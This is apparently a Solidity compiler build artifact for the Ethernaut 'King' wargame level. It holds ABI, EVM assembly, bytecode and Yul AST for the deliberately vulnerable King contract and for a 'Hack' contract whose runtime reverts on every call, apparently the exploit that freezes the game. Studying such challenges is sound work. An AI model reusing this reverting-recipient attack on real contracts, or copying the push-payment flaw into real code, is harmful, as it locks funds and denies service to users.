									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 1047,
									"end": 1057,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 684,
									"end": 1063,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 684,
									"end": 1063,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 684,
									"end": 1063,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 684,
									"end": 1063,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 517,
									"end": 679,
									"name": "tag",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 517,
									"end": 679,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 517,
									"end": 679,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212207334e29c26219d146faf6a2a05995ed7ea74bf2b9e750e3b823c1d275a86db2b64736f6c63430008110033",
									".code": [
										{
											"begin": 517,
											"end": 679,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 517,
											"end": 679,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 517,
											"end": 679,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 517,
											"end": 679,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 517,
											"end": 679,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 517,
											"end": 679,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							},
							"sourceList": [
								"contracts/Ethernaut/09-King.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/09-King.sol\":\"Hack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/09-King.sol\":{\"keccak256\":\"0x43e2236104bd26d2cb67030e0bb73c3f29c582019ba1ab8059e14d7d761af920\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://44b61acb749ccc65c09c2931796b0346bc82b6514b6d66f37b358927d66fd4bc\",\"dweb:/ipfs/QmQiQrHPryeaNBYEcw6LJKyXz7997nFfJLxuDDWiA3Aw4i\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"King": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "_king",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "prize",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/09-King.sol\":59:513  contract King {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/09-King.sol\":183:193  msg.sender */\n  caller\n    /* \"contracts/Ethernaut/09-King.sol\":175:180  owner */\n  0x02\n  0x00\n    /* \"contracts/Ethernaut/09-King.sol\":175:193  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":209:219  msg.sender */\n  caller\n    /* \"contracts/Ethernaut/09-King.sol\":202:206  king */\n  0x00\n  dup1\n    /* \"contracts/Ethernaut/09-King.sol\":202:219  king = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":234:243  msg.value */\n  callvalue\n    /* \"contracts/Ethernaut/09-King.sol\":226:231  prize */\n  0x01\n    /* \"contracts/Ethernaut/09-King.sol\":226:243  prize = msg.value */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/09-King.sol\":59:513  contract King {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/09-King.sol\":59:513  contract King {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x29cc6d6f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe3ac5d26\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/Ethernaut/09-King.sol\":310:315  prize */\n      sload(0x01)\n        /* \"contracts/Ethernaut/09-King.sol\":297:306  msg.value */\n      callvalue\n        /* \"contracts/Ethernaut/09-King.sol\":297:315  msg.value >= prize */\n      lt\n      iszero\n        /* \"contracts/Ethernaut/09-King.sol\":297:338  msg.value >= prize || msg.sender == owner */\n      dup1\n      tag_8\n      jumpi\n      pop\n        /* \"contracts/Ethernaut/09-King.sol\":333:338  owner */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/09-King.sol\":319:338  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/09-King.sol\":319:329  msg.sender */\n      caller\n        /* \"contracts/Ethernaut/09-King.sol\":319:338  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Ethernaut/09-King.sol\":297:338  msg.value >= prize || msg.sender == owner */\n    tag_8:\n        /* \"contracts/Ethernaut/09-King.sol\":289:339  require(msg.value >= prize || msg.sender == owner) */\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n        /* \"contracts/Ethernaut/09-King.sol\":354:358  king */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/09-King.sol\":346:368  payable(king).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/09-King.sol\":346:379  payable(king).transfer(msg.value) */\n      0x08fc\n        /* \"contracts/Ethernaut/09-King.sol\":369:378  msg.value */\n      callvalue\n        /* \"contracts/Ethernaut/09-King.sol\":346:379  payable(king).transfer(msg.value) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n        /* \"contracts/Ethernaut/09-King.sol\":393:403  msg.sender */\n      caller\n        /* \"contracts/Ethernaut/09-King.sol\":386:390  king */\n      0x00\n      dup1\n        /* \"contracts/Ethernaut/09-King.sol\":386:403  king = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/09-King.sol\":418:427  msg.value */\n      callvalue\n        /* \"contracts/Ethernaut/09-King.sol\":410:415  prize */\n      0x01\n        /* \"contracts/Ethernaut/09-King.sol\":410:427  prize = msg.value */\n      dup2\n      swap1\n      sstore\n      stop\n        /* \"contracts/Ethernaut/09-King.sol\":59:513  contract King {... */\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/09-King.sol\":439:510  function _king() public view returns (address) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/09-King.sol\":119:139  address public owner */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/09-King.sol\":97:114  uint public prize */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/09-King.sol\":439:510  function _king() public view returns (address) {... */\n    tag_14:\n        /* \"contracts/Ethernaut/09-King.sol\":477:484  address */\n      0x00\n        /* \"contracts/Ethernaut/09-King.sol\":500:504  king */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/09-King.sol\":493:504  return king */\n      swap1\n      pop\n        /* \"contracts/Ethernaut/09-King.sol\":439:510  function _king() public view returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Ethernaut/09-King.sol\":119:139  address public owner */\n    tag_19:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Ethernaut/09-King.sol\":97:114  uint public prize */\n    tag_23:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_27:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_28:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_35\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_27\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_29:\n        /* \"#utility.yul\":328:352   */\n      tag_37\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_28\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_16:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_39\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_29\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:670   */\n    tag_30:\n        /* \"#utility.yul\":630:637   */\n      0x00\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":648:664   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:670   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":676:794   */\n    tag_31:\n        /* \"#utility.yul\":763:787   */\n      tag_42\n        /* \"#utility.yul\":781:786   */\n      dup2\n        /* \"#utility.yul\":763:787   */\n      tag_30\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":758:761   */\n      dup3\n        /* \"#utility.yul\":751:788   */\n      mstore\n        /* \"#utility.yul\":676:794   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":800:1022   */\n    tag_25:\n        /* \"#utility.yul\":893:897   */\n      0x00\n        /* \"#utility.yul\":931:933   */\n      0x20\n        /* \"#utility.yul\":920:929   */\n      dup3\n        /* \"#utility.yul\":916:934   */\n      add\n        /* \"#utility.yul\":908:934   */\n      swap1\n      pop\n        /* \"#utility.yul\":944:1015   */\n      tag_44\n        /* \"#utility.yul\":1012:1013   */\n      0x00\n        /* \"#utility.yul\":1001:1010   */\n      dup4\n        /* \"#utility.yul\":997:1014   */\n      add\n        /* \"#utility.yul\":988:994   */\n      dup5\n        /* \"#utility.yul\":944:1015   */\n      tag_31\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":800:1022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c7de98535304e97e5507ad5232f1b2f65c0241d67cb56820dc72decb93512a2d64736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_26": {
									"entryPoint": null,
									"id": 26,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405233600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550346001819055506102f48061009b6000396000f3fe6080604052600436106100385760003560e01c806329cc6d6f146101585780638da5cb5b14610183578063e3ac5d26146101ae57610153565b36610153576001543410158061009b5750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b6100a457600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f1935050505015801561010a573d6000803e3d6000fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550346001819055005b600080fd5b34801561016457600080fd5b5061016d6101d9565b60405161017a919061026f565b60405180910390f35b34801561018f57600080fd5b50610198610202565b6040516101a5919061026f565b60405180910390f35b3480156101ba57600080fd5b506101c3610228565b6040516101d091906102a3565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102598261022e565b9050919050565b6102698161024e565b82525050565b60006020820190506102846000830184610260565b92915050565b6000819050919050565b61029d8161028a565b82525050565b60006020820190506102b86000830184610294565b9291505056fea2646970667358221220c7de98535304e97e5507ad5232f1b2f65c0241d67cb56820dc72decb93512a2d64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH2 0x2F4 DUP1 PUSH2 0x9B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x29CC6D6F EQ PUSH2 0x158 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x183 JUMPI DUP1 PUSH4 0xE3AC5D26 EQ PUSH2 0x1AE JUMPI PUSH2 0x153 JUMP JUMPDEST CALLDATASIZE PUSH2 0x153 JUMPI PUSH1 0x1 SLOAD CALLVALUE LT ISZERO DUP1 PUSH2 0x9B JUMPI POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x164 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH2 0x1D9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17A SWAP2 SWAP1 PUSH2 0x26F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x18F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x198 PUSH2 0x202 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A5 SWAP2 SWAP1 PUSH2 0x26F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C3 PUSH2 0x228 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D0 SWAP2 SWAP1 PUSH2 0x2A3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x259 DUP3 PUSH2 0x22E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x269 DUP2 PUSH2 0x24E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x284 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x260 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29D DUP2 PUSH2 0x28A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2B8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x294 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC7 0xDE SWAP9 MSTORE8 MSTORE8 DIV 0xE9 PUSH31 0x5507AD5232F1B2F65C0241D67CB56820DC72DECB93512A2D64736F6C634300 ADDMOD GT STOP CALLER ",
							"sourceMap": "59:454:0:-:0;;;183:10;175:5;;:18;;;;;;;;;;;;;;;;;;209:10;202:4;;:17;;;;;;;;;;;;;;;;;;234:9;226:5;:17;;;;59:454;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_61": {
									"entryPoint": null,
									"id": 61,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@_king_69": {
									"entryPoint": 473,
									"id": 69,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"@owner_7": {
									"entryPoint": 514,
									"id": 7,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@prize_5": {
									"entryPoint": 552,
									"id": 5,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 608,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 660,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 623,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 675,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 590,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 558,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 650,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1025:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "52:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "62:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "84:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "73:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "184:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "194:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "223:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "205:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "205:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "194:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "166:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "176:7:1",
														"type": ""
													}
												],
												"src": "139:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "306:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "323:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "346:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "328:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "328:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "316:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "316:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "316:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "294:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "301:3:1",
														"type": ""
													}
												],
												"src": "241:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "463:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "473:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "485:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "496:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "481:3:1"
																},
																"nodeType": "YulFunctionCall",
